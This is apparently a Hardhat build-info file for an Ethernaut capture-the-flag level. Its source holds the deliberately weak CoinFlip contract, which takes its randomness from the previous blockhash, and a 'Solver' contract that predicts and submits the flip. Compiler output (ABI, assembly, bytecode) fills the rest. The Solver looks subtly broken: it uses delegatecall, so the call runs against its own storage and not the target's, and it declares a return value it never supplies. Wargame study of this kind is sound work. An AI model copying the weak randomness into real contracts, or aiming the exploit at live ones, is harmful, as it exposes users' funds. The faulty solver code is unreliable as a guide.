{
	"id": "e0987f16161c18ffa4484a3e4bdf84d7",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.7",
	"solcLongVersion": "0.8.7+commit.e28d00a7",
	"input": {
		"language": "Solidity",
		"sources": {
			"ethernaut.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.7;\r\n\r\n//import '@openzeppelin/contracts/math/SafeMath.sol';\r\ncontract CoinFlip {\r\n\r\n  uint256 public consecutiveWins;\r\n  uint256 lastHash;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  constructor() public {\r\n    consecutiveWins = 0;\r\n  }\r\n\r\n  function flip(bool _guess) public returns (bool) {\r\n    uint256 blockValue = uint256(blockhash(block.number - 1));\r\n\r\n    if (lastHash == blockValue) {\r\n      revert();\r\n    }\r\n\r\n    lastHash = blockValue;\r\n    uint256 coinFlip = blockValue / FACTOR;\r\n    bool side = coinFlip == 1 ? true : false;\r\n\r\n    if (side == _guess) {\r\n      consecutiveWins++;\r\n      return true;\r\n    } else {\r\n      consecutiveWins = 0;\r\n      return false;\r\n    }\r\n  }\r\n}\r\n\r\ncontract Solver {\r\n    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n    address contractAddr = 0x1b4C3BB63058CE67b9573BEffcBF3737e1697F4F;\r\n    bool previous;\r\n    function solve() public returns (uint256) {\r\n        bool whatToSend = (uint256(blockhash(block.number - 1)) / FACTOR) == 1;\r\n        if(previous == whatToSend) {\r\n            revert(\"try again\");\r\n        }\r\n        contractAddr.delegatecall(abi.encode(bytes4(keccak256(\"flip(bool)\")),whatToSend));\r\n        previous = whatToSend;\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"storageLayout",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"ethernaut.sol": {
				"CoinFlip": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "consecutiveWins",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bool",
									"name": "_guess",
									"type": "bool"
								}
							],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"ethernaut.sol\":115:806  contract CoinFlip {\r... */\n  mstore(0x40, 0x80)\n    /* \"ethernaut.sol\":213:290  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"ethernaut.sol\":196:290  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x02\n  sstore\n    /* \"ethernaut.sol\":297:350  constructor() public {\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"ethernaut.sol\":343:344  0 */\n  0x00\n    /* \"ethernaut.sol\":325:340  consecutiveWins */\n  dup1\n    /* \"ethernaut.sol\":325:344  consecutiveWins = 0 */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"ethernaut.sol\":115:806  contract CoinFlip {\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"ethernaut.sol\":115:806  contract CoinFlip {\r... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1d263f67\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xe6f334d7\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"ethernaut.sol\":356:803  function flip(bool _guess) public returns (bool) {\r... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"ethernaut.sol\":140:170  uint256 public consecutiveWins */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"ethernaut.sol\":356:803  function flip(bool _guess) public returns (bool) {\r... */\n    tag_8:\n        /* \"ethernaut.sol\":399:403  bool */\n      0x00\n        /* \"ethernaut.sol\":412:430  uint256 blockValue */\n      dup1\n        /* \"ethernaut.sol\":466:467  1 */\n      0x01\n        /* \"ethernaut.sol\":451:463  block.number */\n      number\n        /* \"ethernaut.sol\":451:467  block.number - 1 */\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n        /* \"ethernaut.sol\":441:468  blockhash(block.number - 1) */\n      blockhash\n        /* \"ethernaut.sol\":433:469  uint256(blockhash(block.number - 1)) */\n      0x00\n      shr\n        /* \"ethernaut.sol\":412:469  uint256 blockValue = uint256(blockhash(block.number - 1)) */\n      swap1\n      pop\n        /* \"ethernaut.sol\":494:504  blockValue */\n      dup1\n        /* \"ethernaut.sol\":482:490  lastHash */\n      sload(0x01)\n        /* \"ethernaut.sol\":482:504  lastHash == blockValue */\n      eq\n        /* \"ethernaut.sol\":478:531  if (lastHash == blockValue) {\r... */\n      iszero\n      tag_18\n      jumpi\n        /* \"ethernaut.sol\":515:523  revert() */\n      0x00\n      dup1\n      revert\n        /* \"ethernaut.sol\":478:531  if (lastHash == blockValue) {\r... */\n    tag_18:\n        /* \"ethernaut.sol\":550:560  blockValue */\n      dup1\n        /* \"ethernaut.sol\":539:547  lastHash */\n      0x01\n        /* \"ethernaut.sol\":539:560  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"ethernaut.sol\":567:583  uint256 coinFlip */\n      0x00\n        /* \"ethernaut.sol\":599:605  FACTOR */\n      sload(0x02)\n        /* \"ethernaut.sol\":586:596  blockValue */\n      dup3\n        /* \"ethernaut.sol\":586:605  blockValue / FACTOR */\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n        /* \"ethernaut.sol\":567:605  uint256 coinFlip = blockValue / FACTOR */\n      swap1\n      pop\n        /* \"ethernaut.sol\":612:621  bool side */\n      0x00\n        /* \"ethernaut.sol\":636:637  1 */\n      0x01\n        /* \"ethernaut.sol\":624:632  coinFlip */\n      dup3\n        /* \"ethernaut.sol\":624:637  coinFlip == 1 */\n      eq\n        /* \"ethernaut.sol\":624:652  coinFlip == 1 ? true : false */\n      tag_21\n      jumpi\n        /* \"ethernaut.sol\":647:652  false */\n      0x00\n        /* \"ethernaut.sol\":624:652  coinFlip == 1 ? true : false */\n      jump(tag_22)\n    tag_21:\n        /* \"ethernaut.sol\":640:644  true */\n      0x01\n        /* \"ethernaut.sol\":624:652  coinFlip == 1 ? true : false */\n    tag_22:\n        /* \"ethernaut.sol\":612:652  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"ethernaut.sol\":673:679  _guess */\n      dup5\n        /* \"ethernaut.sol\":665:679  side == _guess */\n      iszero\n      iszero\n        /* \"ethernaut.sol\":665:669  side */\n      dup2\n        /* \"ethernaut.sol\":665:679  side == _guess */\n      iszero\n      iszero\n      eq\n        /* \"ethernaut.sol\":661:798  if (side == _guess) {\r... */\n      iszero\n      tag_23\n      jumpi\n        /* \"ethernaut.sol\":690:705  consecutiveWins */\n      0x00\n      dup1\n        /* \"ethernaut.sol\":690:707  consecutiveWins++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_24\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"ethernaut.sol\":723:727  true */\n      0x01\n        /* \"ethernaut.sol\":716:727  return true */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump(tag_15)\n        /* \"ethernaut.sol\":661:798  if (side == _guess) {\r... */\n    tag_23:\n        /* \"ethernaut.sol\":768:769  0 */\n      0x00\n        /* \"ethernaut.sol\":750:765  consecutiveWins */\n      dup1\n        /* \"ethernaut.sol\":750:769  consecutiveWins = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"ethernaut.sol\":785:790  false */\n      0x00\n        /* \"ethernaut.sol\":778:790  return false */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"ethernaut.sol\":356:803  function flip(bool _guess) public returns (bool) {\r... */\n    tag_15:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"ethernaut.sol\":140:170  uint256 public consecutiveWins */\n    tag_12:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:140   */\n    tag_28:\n        /* \"#utility.yul\":50:55   */\n      0x00\n        /* \"#utility.yul\":88:94   */\n      dup2\n        /* \"#utility.yul\":75:95   */\n      calldataload\n        /* \"#utility.yul\":66:95   */\n      swap1\n      pop\n        /* \"#utility.yul\":104:134   */\n      tag_30\n        /* \"#utility.yul\":128:133   */\n      dup2\n        /* \"#utility.yul\":104:134   */\n      tag_31\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":7:140   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":146:469   */\n    tag_7:\n        /* \"#utility.yul\":202:208   */\n      0x00\n        /* \"#utility.yul\":251:253   */\n      0x20\n        /* \"#utility.yul\":239:248   */\n      dup3\n        /* \"#utility.yul\":230:237   */\n      dup5\n        /* \"#utility.yul\":226:249   */\n      sub\n        /* \"#utility.yul\":222:254   */\n      slt\n        /* \"#utility.yul\":219:338   */\n      iszero\n      tag_33\n      jumpi\n        /* \"#utility.yul\":257:336   */\n      tag_34\n      tag_35\n      jump\t// in\n    tag_34:\n        /* \"#utility.yul\":219:338   */\n    tag_33:\n        /* \"#utility.yul\":377:378   */\n      0x00\n        /* \"#utility.yul\":402:452   */\n      tag_36\n        /* \"#utility.yul\":444:451   */\n      dup5\n        /* \"#utility.yul\":435:441   */\n      dup3\n        /* \"#utility.yul\":424:433   */\n      dup6\n        /* \"#utility.yul\":420:442   */\n      add\n        /* \"#utility.yul\":402:452   */\n      tag_28\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":392:452   */\n      swap2\n      pop\n        /* \"#utility.yul\":348:462   */\n      pop\n        /* \"#utility.yul\":146:469   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":475:584   */\n    tag_37:\n        /* \"#utility.yul\":556:577   */\n      tag_39\n        /* \"#utility.yul\":571:576   */\n      dup2\n        /* \"#utility.yul\":556:577   */\n      tag_40\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":551:554   */\n      dup3\n        /* \"#utility.yul\":544:578   */\n      mstore\n        /* \"#utility.yul\":475:584   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":590:708   */\n    tag_41:\n        /* \"#utility.yul\":677:701   */\n      tag_43\n        /* \"#utility.yul\":695:700   */\n      dup2\n        /* \"#utility.yul\":677:701   */\n      tag_44\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":672:675   */\n      dup3\n        /* \"#utility.yul\":665:702   */\n      mstore\n        /* \"#utility.yul\":590:708   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":714:924   */\n    tag_10:\n        /* \"#utility.yul\":801:805   */\n      0x00\n        /* \"#utility.yul\":839:841   */\n      0x20\n        /* \"#utility.yul\":828:837   */\n      dup3\n        /* \"#utility.yul\":824:842   */\n      add\n        /* \"#utility.yul\":816:842   */\n      swap1\n      pop\n        /* \"#utility.yul\":852:917   */\n      tag_46\n        /* \"#utility.yul\":914:915   */\n      0x00\n        /* \"#utility.yul\":903:912   */\n      dup4\n        /* \"#utility.yul\":899:916   */\n      add\n        /* \"#utility.yul\":890:896   */\n      dup5\n        /* \"#utility.yul\":852:917   */\n      tag_37\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":714:924   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":930:1152   */\n    tag_14:\n        /* \"#utility.yul\":1023:1027   */\n      0x00\n        /* \"#utility.yul\":1061:1063   */\n      0x20\n        /* \"#utility.yul\":1050:1059   */\n      dup3\n        /* \"#utility.yul\":1046:1064   */\n      add\n        /* \"#utility.yul\":1038:1064   */\n      swap1\n      pop\n        /* \"#utility.yul\":1074:1145   */\n      tag_48\n        /* \"#utility.yul\":1142:1143   */\n      0x00\n        /* \"#utility.yul\":1131:1140   */\n      dup4\n        /* \"#utility.yul\":1127:1144   */\n      add\n        /* \"#utility.yul\":1118:1124   */\n      dup5\n        /* \"#utility.yul\":1074:1145   */\n      tag_41\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":930:1152   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1239:1424   */\n    tag_20:\n        /* \"#utility.yul\":1279:1280   */\n      0x00\n        /* \"#utility.yul\":1296:1316   */\n      tag_52\n        /* \"#utility.yul\":1314:1315   */\n      dup3\n        /* \"#utility.yul\":1296:1316   */\n      tag_44\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":1291:1316   */\n      swap2\n      pop\n        /* \"#utility.yul\":1330:1350   */\n      tag_53\n        /* \"#utility.yul\":1348:1349   */\n      dup4\n        /* \"#utility.yul\":1330:1350   */\n      tag_44\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1325:1350   */\n      swap3\n      pop\n        /* \"#utility.yul\":1369:1370   */\n      dup3\n        /* \"#utility.yul\":1359:1394   */\n      tag_54\n      jumpi\n        /* \"#utility.yul\":1374:1392   */\n      tag_55\n      tag_56\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1359:1394   */\n    tag_54:\n        /* \"#utility.yul\":1416:1417   */\n      dup3\n        /* \"#utility.yul\":1413:1414   */\n      dup3\n        /* \"#utility.yul\":1409:1418   */\n      div\n        /* \"#utility.yul\":1404:1418   */\n      swap1\n      pop\n        /* \"#utility.yul\":1239:1424   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1430:1621   */\n    tag_17:\n        /* \"#utility.yul\":1470:1474   */\n      0x00\n        /* \"#utility.yul\":1490:1510   */\n      tag_58\n        /* \"#utility.yul\":1508:1509   */\n      dup3\n        /* \"#utility.yul\":1490:1510   */\n      tag_44\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":1485:1510   */\n      swap2\n      pop\n        /* \"#utility.yul\":1524:1544   */\n      tag_59\n        /* \"#utility.yul\":1542:1543   */\n      dup4\n        /* \"#utility.yul\":1524:1544   */\n      tag_44\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1519:1544   */\n      swap3\n      pop\n        /* \"#utility.yul\":1563:1564   */\n      dup3\n        /* \"#utility.yul\":1560:1561   */\n      dup3\n        /* \"#utility.yul\":1557:1565   */\n      lt\n        /* \"#utility.yul\":1554:1588   */\n      iszero\n      tag_60\n      jumpi\n        /* \"#utility.yul\":1568:1586   */\n      tag_61\n      tag_62\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1554:1588   */\n    tag_60:\n        /* \"#utility.yul\":1613:1614   */\n      dup3\n        /* \"#utility.yul\":1610:1611   */\n      dup3\n        /* \"#utility.yul\":1606:1615   */\n      sub\n        /* \"#utility.yul\":1598:1615   */\n      swap1\n      pop\n        /* \"#utility.yul\":1430:1621   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1627:1717   */\n    tag_40:\n        /* \"#utility.yul\":1661:1668   */\n      0x00\n        /* \"#utility.yul\":1704:1709   */\n      dup2\n        /* \"#utility.yul\":1697:1710   */\n      iszero\n        /* \"#utility.yul\":1690:1711   */\n      iszero\n        /* \"#utility.yul\":1679:1711   */\n      swap1\n      pop\n        /* \"#utility.yul\":1627:1717   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1723:1800   */\n    tag_44:\n        /* \"#utility.yul\":1760:1767   */\n      0x00\n        /* \"#utility.yul\":1789:1794   */\n      dup2\n        /* \"#utility.yul\":1778:1794   */\n      swap1\n      pop\n        /* \"#utility.yul\":1723:1800   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1806:2039   */\n    tag_25:\n        /* \"#utility.yul\":1845:1848   */\n      0x00\n        /* \"#utility.yul\":1868:1892   */\n      tag_66\n        /* \"#utility.yul\":1886:1891   */\n      dup3\n        /* \"#utility.yul\":1868:1892   */\n      tag_44\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":1859:1892   */\n      swap2\n      pop\n        /* \"#utility.yul\":1914:1980   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":1907:1912   */\n      dup3\n        /* \"#utility.yul\":1904:1981   */\n      eq\n        /* \"#utility.yul\":1901:2004   */\n      iszero\n      tag_67\n      jumpi\n        /* \"#utility.yul\":1984:2002   */\n      tag_68\n      tag_62\n      jump\t// in\n    tag_68:\n        /* \"#utility.yul\":1901:2004   */\n    tag_67:\n        /* \"#utility.yul\":2031:2032   */\n      0x01\n        /* \"#utility.yul\":2024:2029   */\n      dup3\n        /* \"#utility.yul\":2020:2033   */\n      add\n        /* \"#utility.yul\":2013:2033   */\n      swap1\n      pop\n        /* \"#utility.yul\":1806:2039   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2045:2225   */\n    tag_62:\n        /* \"#utility.yul\":2093:2170   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2090:2091   */\n      0x00\n        /* \"#utility.yul\":2083:2171   */\n      mstore\n        /* \"#utility.yul\":2190:2194   */\n      0x11\n        /* \"#utility.yul\":2187:2188   */\n      0x04\n        /* \"#utility.yul\":2180:2195   */\n      mstore\n        /* \"#utility.yul\":2214:2218   */\n      0x24\n        /* \"#utility.yul\":2211:2212   */\n      0x00\n        /* \"#utility.yul\":2204:2219   */\n      revert\n        /* \"#utility.yul\":2231:2411   */\n    tag_56:\n        /* \"#utility.yul\":2279:2356   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2276:2277   */\n      0x00\n        /* \"#utility.yul\":2269:2357   */\n      mstore\n        /* \"#utility.yul\":2376:2380   */\n      0x12\n        /* \"#utility.yul\":2373:2374   */\n      0x04\n        /* \"#utility.yul\":2366:2381   */\n      mstore\n        /* \"#utility.yul\":2400:2404   */\n      0x24\n        /* \"#utility.yul\":2397:2398   */\n      0x00\n        /* \"#utility.yul\":2390:2405   */\n      revert\n        /* \"#utility.yul\":2540:2657   */\n    tag_35:\n        /* \"#utility.yul\":2649:2650   */\n      0x00\n        /* \"#utility.yul\":2646:2647   */\n      dup1\n        /* \"#utility.yul\":2639:2651   */\n      revert\n        /* \"#utility.yul\":2663:2779   */\n    tag_31:\n        /* \"#utility.yul\":2733:2754   */\n      tag_75\n        /* \"#utility.yul\":2748:2753   */\n      dup2\n        /* \"#utility.yul\":2733:2754   */\n      tag_40\n      jump\t// in\n    tag_75:\n        /* \"#utility.yul\":2726:2731   */\n      dup2\n        /* \"#utility.yul\":2723:2755   */\n      eq\n        /* \"#utility.yul\":2713:2773   */\n      tag_76\n      jumpi\n        /* \"#utility.yul\":2769:2770   */\n      0x00\n        /* \"#utility.yul\":2766:2767   */\n      dup1\n        /* \"#utility.yul\":2759:2771   */\n      revert\n        /* \"#utility.yul\":2713:2773   */\n    tag_76:\n        /* \"#utility.yul\":2663:2779   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122070f841c0b35b66133813d11abb56cf0494aa9d9a9f739c560475c962e3960e3264736f6c63430008070033\n}\n",
						"bytecode": {
							"functionDebugData": {
								"@_16": {
									"entryPoint": null,
									"id": 16,
									"parameterSlots": 0,
									"returnSlots": 0
								}
							},
							"generatedSources": [],
							"linkReferences": {},
							"object": "60806040527f800000000000000000000000000000000000000000000000000000000000000060025534801561003457600080fd5b50600080819055506103308061004b6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061013b565b610089565b6040516100629190610186565b60405180910390f35b610073610120565b60405161008091906101a1565b60405180910390f35b60008060014361009991906101ed565b4060001c90508060015414156100ae57600080fd5b806001819055506000600254826100c591906101bc565b90506000600182146100d85760006100db565b60015b9050841515811515141561010c576000808154809291906100fb90610237565b91905055506001935050505061011b565b60008081905550600093505050505b919050565b60005481565b600081359050610135816102e3565b92915050565b600060208284031215610151576101506102de565b5b600061015f84828501610126565b91505092915050565b61017181610221565b82525050565b6101808161022d565b82525050565b600060208201905061019b6000830184610168565b92915050565b60006020820190506101b66000830184610177565b92915050565b60006101c78261022d565b91506101d28361022d565b9250826101e2576101e16102af565b5b828204905092915050565b60006101f88261022d565b91506102038361022d565b92508282101561021657610215610280565b5b828203905092915050565b60008115159050919050565b6000819050919050565b60006102428261022d565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82141561027557610274610280565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600080fd5b6102ec81610221565b81146102f757600080fd5b5056fea264697066735822122070f841c0b35b66133813d11abb56cf0494aa9d9a9f739c560475c962e3960e3264736f6c63430008070033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x2 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x34 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH2 0x330 DUP1 PUSH2 0x4B PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x13B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x186 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x120 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x1A1 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x1 NUMBER PUSH2 0x99 SWAP2 SWAP1 PUSH2 0x1ED JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD EQ ISZERO PUSH2 0xAE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 SLOAD DUP3 PUSH2 0xC5 SWAP2 SWAP1 PUSH2 0x1BC JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xD8 JUMPI PUSH1 0x0 PUSH2 0xDB JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO EQ ISZERO PUSH2 0x10C JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0xFB SWAP1 PUSH2 0x237 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x11B JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x135 DUP2 PUSH2 0x2E3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x151 JUMPI PUSH2 0x150 PUSH2 0x2DE JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x15F DUP5 DUP3 DUP6 ADD PUSH2 0x126 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x171 DUP2 PUSH2 0x221 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x180 DUP2 PUSH2 0x22D JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x19B PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x168 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1B6 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x177 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1C7 DUP3 PUSH2 0x22D JUMP JUMPDEST SWAP2 POP PUSH2 0x1D2 DUP4 PUSH2 0x22D JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x1E2 JUMPI PUSH2 0x1E1 PUSH2 0x2AF JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F8 DUP3 PUSH2 0x22D JUMP JUMPDEST SWAP2 POP PUSH2 0x203 DUP4 PUSH2 0x22D JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x216 JUMPI PUSH2 0x215 PUSH2 0x280 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x242 DUP3 PUSH2 0x22D JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 EQ ISZERO PUSH2 0x275 JUMPI PUSH2 0x274 PUSH2 0x280 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x2EC DUP2 PUSH2 0x221 JUMP JUMPDEST DUP2 EQ PUSH2 0x2F7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 PUSH17 0xF841C0B35B66133813D11ABB56CF0494AA SWAP14 SWAP11 SWAP16 PUSH20 0x9C560475C962E3960E3264736F6C634300080700 CALLER ",
							"sourceMap": "115:691:0:-:0;;;213:77;196:94;;297:53;;;;;;;;;;343:1;325:15;:19;;;;115:691;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@consecutiveWins_3": {
									"entryPoint": 288,
									"id": 3,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@flip_80": {
									"entryPoint": 137,
									"id": 80,
									"parameterSlots": 1,
									"returnSlots": 1
